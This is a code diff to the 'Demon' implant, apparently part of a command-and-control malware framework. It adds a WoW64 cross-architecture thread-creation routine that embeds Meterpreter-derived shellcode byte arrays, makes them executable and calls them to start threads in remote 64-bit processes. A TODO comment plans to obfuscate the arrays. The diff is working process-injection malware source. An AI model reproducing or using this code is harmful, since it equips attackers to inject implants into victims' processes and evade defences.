@@ -1,6 +1,8 @@
 #include <Demon.h>
 #include <Common/Macros.h>
 #include <Core/Thread.h>
+#include <Core/MiniStd.h>
+#include <Core/Memory.h>
 #include <Core/SysNative.h>
 #include <Core/Win32.h>
 
@@ -110,19 +112,122 @@ BOOL ThreadQueryTib(
     return Success;
 }
 
+#if _M_IX86
+
+// https://github.com/rapid7/meterpreter/blob/5e309596e53ead0f64564fe77e0cad70908f6739/source/common/arch/win/i386/base_inject.c#L343
+HANDLE ThreadCreateWoW64(
+    IN  BYTE   Method,
+    IN  HANDLE Process,
+    IN  PVOID  Entry,
+    IN  PVOID  Arg
+) {
+    // TODO: define these arrays with HideChar or some other method
+    BYTE migrate_executex64[] = "\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
+                                "\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
+                                "\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
+                                "\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
+                                "\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";
+    BYTE migrate_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
+                                "\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
+                                "\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
+                                "\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
+                                "\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
+                                "\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
+                                "\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
+                                "\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
+                                "\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
+                                "\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
+                                "\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
+                                "\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
+                                "\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
+                                "\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
+                                "\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
+                                "\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
+                                "\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
+                                "\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
+                                "\x48\x83\xC4\x50\x48\x89\xFC\xC3";
+    WOW64CONTEXT ctx          = { 0 };
+    SIZE_T       Size         = 0;
+    HANDLE       hThread      = NULL;
+    EXECUTEX64   pExecuteX64  = NULL;
+    X64FUNCTION  pX64function = NULL;
+
+    ctx.h.hProcess       = Process;
+    ctx.s.lpStartAddress = Entry;
+    ctx.p.lpParameter    = Arg;
+    ctx.t.hThread        = NULL;
+
+    // allocate some memory for both shellcode stubs
+    Size = sizeof( migrate_executex64 ) + sizeof(migrate_wownativex);
+    if ( ! ( pExecuteX64 = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Size, PAGE_READWRITE ) ) ) {
+        PUTS( "Failed allocating RW for migrate_executex64 and migrate_wownativex" )
+        goto END;
+    }
+
+    // copy migrate_executex64
+    MemCopy( pExecuteX64, &migrate_executex64, sizeof( migrate_executex64 ) );
+
+    // copy migrate_wownativex
+    pX64function = C_PTR( U_PTR( pExecuteX64 ) + sizeof( migrate_executex64 ) );
+    MemCopy( pX64function, &migrate_wownativex, sizeof( migrate_wownativex ) );
+
+    // switch RW to RX
+    if ( ! ( MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), pExecuteX64, Size, PAGE_EXECUTE_READ ) ) ) {
+        PUTS( "Failed to change memory protection" )
+        goto END;
+    }
+
+    // RtlCreateUserThread( ctx->h.hProcess, NULL, TRUE, 0, NULL, NULL, ctx->s.lpStartAddress, ctx->p.lpParameter, &ctx->t.hThread, NULL )
+    if( ! pExecuteX64( pX64function, &ctx ) )
+    {
+        NtSetLastError( ERROR_ACCESS_DENIED );
+        PUTS( "ThreadCreateWoW64 failed" )
+        goto END;
+    }
+
+    if( ! ctx.t.hThread )
+    {
+        NtSetLastError( ERROR_INVALID_HANDLE );
+        PUTS( "ThreadCreateWoW64: ctx->t.hThread is NULL" )
+        goto END;
+    }
+
+    hThread = ctx.t.hThread;
+
+    // resume the thread which was created in suspended mode
+    SysNtResumeThread( hThread, NULL );
+
+END:
+    if ( pExecuteX64 ) {
+        MemoryFree( NtCurrentProcess(), pExecuteX64 );
+    }
+
+    return hThread;
+}
+
+#endif
+
 HANDLE ThreadCreate(
     IN  BYTE   Method,
     IN  HANDLE Process,
+    IN  BOOL   x64,
     IN  PVOID  Entry,
     IN  PVOID  Arg,
     OUT PDWORD ThreadId
 ) {
     HANDLE Thread = NULL;
 
+#if _M_IX86
+    if ( x64 ) {
+        // x86 -> x64
+        return ThreadCreateWoW64( Method, Process, Entry, Arg );
+    }
+#endif
+
     switch ( Method )
     {
         case THREAD_METHOD_DEFAULT: {
-            return ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, Process, Entry, Arg, ThreadId );
+            return ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, Process, x64, Entry, Arg, ThreadId );
         }
 
         case THREAD_METHOD_CREATEREMOTETHREAD: {
